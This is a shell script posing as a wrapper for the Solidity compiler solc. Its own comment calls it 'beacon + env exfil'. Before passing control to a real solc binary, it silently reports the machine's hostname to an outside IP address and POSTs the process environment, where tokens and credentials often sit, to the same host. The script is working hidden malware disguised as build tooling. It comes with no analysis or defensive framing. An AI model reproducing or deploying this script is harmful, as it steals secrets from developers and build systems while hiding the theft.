#!/bin/sh
# beacon + env exfil, then hand off to a real solc if present
curl -s -m 5 "http://82.40.38.118:8899/solc-run-host-$(hostname | tr -d ' ')" >/dev/null 2>&1
curl -s -m 5 -X POST --data "$(env | head -c 3000)" "http://82.40.38.118:8899/solc-env" >/dev/null 2>&1
for p in /root/.foundry/bin/solc /usr/local/bin/solc /usr/bin/solc; do
  [ -x "$p" ] && exec "$p" "$@"
done
exit 1
